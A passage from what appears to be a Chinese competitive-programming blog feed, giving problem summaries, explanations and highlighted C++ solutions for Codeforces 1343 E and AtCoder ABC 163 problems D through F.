class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> k <span class="token operator">*</span> <span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        pref<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> pref<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> pref<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> vis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>n <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> pref<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="E-Weights-Distributing"><a href="#E-Weights-Distributing" class="headerlink" title="E. Weights Distributing"></a><a href="https://codeforces.com/contest/1343/problem/E">E. Weights Distributing</a></h2><ul><li><p>题意：<br>给定$n$ 个点，$m$条边，$m$个边的权值，点$a,b,c$,让你求出如何分配权值，使得$a-&gt;b,b-&gt;c$这条路径的权值和最小，输出这个权值和。</p></li><li><p>题解&amp;代码:<br>考虑中间点$x$,那么只要求出$a-&gt;x,x-&gt;b,b-&gt;x,c-&gt;x$之和即可，使用三次bfs求出$a,b,c$到各点的距离，之后枚举点即可。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">5e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7ffffff</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">;</span><span class="token keyword">int</span> p<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> pre<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">&amp;</span>vec<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> que<span class="token punctuation">;</span>    que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>rt<span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> tp<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>que<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        tp <span class="token operator">=</span> que<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> que<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">:</span> G<span class="token punctuation">[</span>tp<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>inf<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> vec<span class="token punctuation">[</span>tp<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>ll pref<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m <span class="token operator">>></span> a <span class="token operator">>></span> b <span class="token operator">>></span> c<span class="token punctuation">;</span>    <span class="token function">fill</span><span class="token punctuation">(</span>pref<span class="token punctuation">,</span> pref <span class="token operator">+</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> u<span class="token punctuation">,</span> v<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> u <span class="token operator">>></span> v<span class="token punctuation">;</span>        G<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">,</span> G<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">path1</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>inf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">path2</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>inf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">path3</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>inf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">bfs</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> path1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">bfs</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> path2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">bfs</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> path3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> p <span class="token operator">+</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        pref<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> pref<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ll<span class="token punctuation">)</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    ll ans <span class="token operator">=</span> <span class="token number">1e18</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>path1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> path2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> path3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span>m<span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        ans <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> pref<span class="token punctuation">[</span>path2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> pref<span class="token punctuation">[</span>path1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> path2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> path3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>            cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Codeforces </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AtCoder ABC 163</title>
      <link href="/2020/04/20/AtCoder-ABC-163/"/>
      <url>/2020/04/20/AtCoder-ABC-163/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="AtCoder-ABC-163-D-F"><a href="#AtCoder-ABC-163-D-F" class="headerlink" title="AtCoder ABC 163 (D~F)"></a>AtCoder ABC 163 (D~F)</h1><h2 id="D-Sum-of-Large-Numbers"><a href="#D-Sum-of-Large-Numbers" class="headerlink" title="D.Sum of Large Numbers"></a>D.Sum of Large Numbers</h2><ul><li>题意：<br>给定两个数，$N,K$ ，有$N+1$个数，分别是$10^{100}+1,10^{100}+2….,10^{100}+N$,问至少取K个数，取得的数字之和不同的个数是多少。</li><li>题解:<br>可以发现，取不同个数的数字是不同的，所以只要知道在${0,1,2,…,N} , N+1$个数中,取x个数，这x个数表示的范围是多少。可以发现$1+2+…+x \leq sum\leq(n-x)+(n-x+1)+…+n$所以，知道了这些，就可以枚举$k$到$n$，就能得出答案了。<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> k<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> k<span class="token punctuation">;</span>    ll lsum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> rsum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        lsum <span class="token operator">+=</span> i<span class="token punctuation">;</span>        rsum <span class="token operator">+=</span> n  <span class="token operator">-</span> i<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    sum <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> rsum <span class="token operator">-</span> lsum <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> mod<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> k<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        lsum <span class="token operator">+=</span> i<span class="token punctuation">,</span> rsum <span class="token operator">+=</span> n <span class="token operator">-</span> i<span class="token punctuation">;</span>      <span class="token comment">//  cout &lt;&lt; lsum &lt;&lt; " " &lt;&lt; rsum &lt;&lt; " " &lt;&lt; rsum - lsum &lt;&lt; "\n";</span>        sum <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> rsum <span class="token operator">-</span> lsum <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> mod<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> sum <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h2 id="E-Active-Infants"><a href="#E-Active-Infants" class="headerlink" title="E. Active Infants"></a>E. Active Infants</h2><ul><li>题意：<br>给定$N$个数，可以进行一次任意调序。定义一个$sum$，表示$\sum<em>{i=1}^{n} a[i]*abs(pos</em>{change})$，问求得的$sum$最大是多少？</li><li>题解：<br>可以发现，使得当前值最大的该变量就是将当前值移到数组首端或者末端。就可以很自然而然的想到要用dp求解。<br>$dp[l][r]$ 表示在$l~r$这个范围还没有被占用的最大$sum$值。<br>可以得到状态转移方程:<br>$dp[l][r] = max(dp[l][r], dp[l][r + 1] + a[i]<em> abs(pos - (r+1));<br>dp[l][r] = max(dp[l][r], dp[l-1][r] + a[i]</em> abs(pos - (l-1));$</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ll dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> N<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span>ll<span class="token punctuation">,</span> ll<span class="token operator">>></span> <span class="token function">vec</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>        vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second <span class="token operator">=</span> <span class="token punctuation">(</span>ll<span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>vec<span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">rend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> i<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> l <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r <span class="token operator">=</span> N <span class="token operator">-</span> i <span class="token operator">+</span> j<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>r <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> N<span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> vec<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">*</span> <span class="token function">abs</span><span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>second <span class="token operator">-</span> r <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">+</span> vec<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">*</span> <span class="token function">abs</span><span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>second <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    ll ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> vec<span class="token punctuation">[</span>N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">*</span> <span class="token function">abs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> vec<span class="token punctuation">[</span>N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="F-path-pass-i"><a href="#F-path-pass-i" class="headerlink" title="F. path pass i"></a>F. path pass i</h2><ul><li><p>题意：<br>给定一棵树，有$N$个节点，每个节点有一种颜色，问包含每种颜色的简单路径个数是多少。</p></li><li><p>题解：<br>正的计数很难做，可以知道经过所有节点的简单路径总个数是$N*(N+1)/2$ 。那么只要求出简单路径上没有该颜色的个数，就可以求出答案。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ll <span class="token function">cal</span><span class="token punctuation">(</span>ll n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> n <span class="token operator">*</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//图</span><span class="token keyword">int</span> c<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//颜色</span><span class="token keyword">int</span> sz<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> sum<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//sz[i]表示以i为根节点的子节点个数 ,  sum[i] 表示 以颜色为 i 的所有节点个数</span>ll ans<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//答案</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">,</span><span class="token keyword">int</span> fa<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    sz<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> in <span class="token operator">=</span> sum<span class="token punctuation">[</span>c<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> v<span class="token operator">:</span>G<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>v <span class="token operator">==</span> fa<span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> front <span class="token operator">=</span> sum<span class="token punctuation">[</span>c<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> u<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> back <span class="token operator">=</span> sum<span class="token punctuation">[</span>c<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">-</span> front<span class="token punctuation">;</span>        ans<span class="token punctuation">[</span>c<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span>sz<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>ll<span class="token punctuation">)</span>back<span class="token punctuation">)</span><span class="token punctuation">;</span>        sz<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+=</span> sz<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        sum<span class="token punctuation">[</span>c<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> sz<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> in<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> N<span class="token punctuation">;</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> a <span class="token operator">>></span> b<span class="token punctuation">;</span>        G<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        G<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    ans<span class="token punctuation">[</span>N<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span><span class="token punctuation">(</span>N <span class="token operator">-</span> sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>       <span class="token comment">// cout &lt;&lt; c[i]&lt;&lt;" "&lt;&lt;sum[i] &lt;&lt; "\n";</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
